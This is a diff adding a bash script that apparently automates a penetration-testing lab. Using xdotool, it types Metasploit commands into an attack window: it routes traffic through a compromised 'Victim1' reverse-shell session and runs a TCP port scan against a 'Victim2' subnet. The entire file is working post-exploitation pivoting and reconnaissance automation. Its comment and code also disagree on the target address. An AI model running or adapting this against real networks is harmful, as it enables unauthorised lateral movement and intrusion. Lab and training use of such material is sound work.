@@ -1,0 +1,26 @@
+#!/bin/bash
+###############################
+# Script to scan other networks via Reverse Shell (Victim1 session)
+# The commands using metasploit are
+# exit                                     <--- exit Windows shell and go back to meterpreter
+# route add 172.16.10.0 255.255.255.0 1    <--- all conections to Victim2 subnet will go through Victim1 (its Reverse Shell session)
+# use auxiliary/scanner/portscan/tcp       <--- use port scan attack
+# set RHOSTS 172.16.11.11                  <--- Victim2
+# set PORTS                                <--- Scan those TCP ports
+###############################
+
+echo "Wait for the end of Port Scan script..."
+
+xdotool windowactivate `cat /tmp/attack_window`
+xdotool type --window `cat /tmp/attack_window` --delay 100 "route add 172.16.10.0 255.255.255.0 1"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "use auxiliary/scanner/portscan/tcp"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "set RHOSTS 172.16.10.11"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "set PORTS 442-444,8079-8081"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "run"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+
+echo "Port Scan running."
